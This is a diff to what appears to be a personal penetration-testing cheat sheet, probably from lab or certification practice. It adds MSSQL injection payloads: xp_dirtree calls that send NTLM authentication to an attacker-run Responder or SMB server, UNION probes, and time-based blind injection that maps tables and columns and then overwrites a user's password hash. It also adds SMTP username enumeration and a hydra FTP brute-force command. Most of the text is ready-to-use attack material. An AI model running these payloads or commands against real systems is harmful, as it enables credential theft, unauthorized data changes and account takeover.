@@ -45,6 +45,7 @@
   - [dnsrecon](#dnsrecon)
   - [WinRM](#winrm)
   - [sc.exe](#sc.exe)
+  - [smtp-user-enum](#smtp-user-enum)
 - [SSH](#ssh)
   - [SSH KEY](#ssh-key)
   - [SSH Tunneling](#ssh-tunneling)
@@ -307,6 +308,48 @@ sqlitebrowser ma.db
 or
 sudo Responder -I tun0 -A
 ';EXEC xp_dirtree \\192.168.45.176\share
+
+or
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py tools .
+' OR 1=1 ; exec master.dbo.xp_dirtree '\\192.168.49.239\test';--
+```
+
+- mssqli UNION-based Payloads
+```bash
+# check number of the column
+' UNION ALL select 1, 2 --
+' UNION select 1, 2 --;
+```
+
+- mssqli Blind SQL Injections
+```bash
+# check if its working
+'; IF (1=1) WAITFOR DELAY '0:0:10';--
+'; IF (1=2) WAITFOR DELAY '0:0:10';--
+
+'; IF ((select count(name) from sys.tables where name = 'user')=1) WAITFOR DELAY '0:0:10';--
+'; IF ((select count(name) from sys.tables where name = 'users')=1) WAITFOR DELAY '0:0:10';--
+
+# we blindly verify that there is a column named USERNAME in the table USERS.
+'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'user%')=1) WAITFOR DELAY '0:0:10';--
+
+# figure out the name of the column holding the password
+'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'password')=1) WAITFOR DELAY '0:0:10';--
+'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name like 'pass%')=1) WAITFOR DELAY '0:0:10';--
+'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name like 'passw%')=1) WAITFOR DELAY '0:0:10';--
+'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'password_hash')=1) WAITFOR DELAY '0:0:10';--
+
+# find username
+USERNAME like 'a%', USERNAME like 'b%', USERNAME like 'c%'
+'; IF ((select count(username) from users where username = 'butch')=1) WAITFOR DELAY '0:0:10';--
+
+# update password
+'; update users set password_hash = 'tacos123' where username = 'butch';--
+'; update users set password_hash = '6183c9c42758fa0e16509b384e2c92c8a21263afa49e057609e3a7fb0e8e5ebb' where username = 'butch';--
+
+# check if password has been updated
+'; IF ((select count(username) from users where username = 'butch' and password_hash = 'tacos123')=1) WAITFOR DELAY '0:0:10';--
+'; IF ((select count(username) from users where username = 'butch' and password_hash = '6183c9c42758fa0e16509b384e2c92c8a21263afa49e057609e3a7fb0e8e5ebb')=1) WAITFOR DELAY '0:0:10';--
 ```
 
 - postgresql command injection
@@ -876,7 +919,12 @@ winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
 ```bash
 sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
 sc.exe \\TARGET start THMservice
+```
 
+### smtp-user-enum
+```bash
+# with found usernames, use them against FTP, SSH ETC...
+smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -t 192.168.177.63
 ```
 
 # with powershell
@@ -1083,6 +1131,16 @@ echo "AddType application/x-httpd-php .xxx" > htaccess
 
 ```bash
 pdf2john Infrastructure.pdf > pdf.txt
+```
+
+```bash
+hydra -e nsr -L users.txt -P users.txt 192.168.X.X ftp
+```
+
+```bash
+echo -n 'tacos123' | md5sum
+echo -n 'tacos123' | sha1sum
+echo -n 'tacos123' | sha256sum 
 ```
 
 
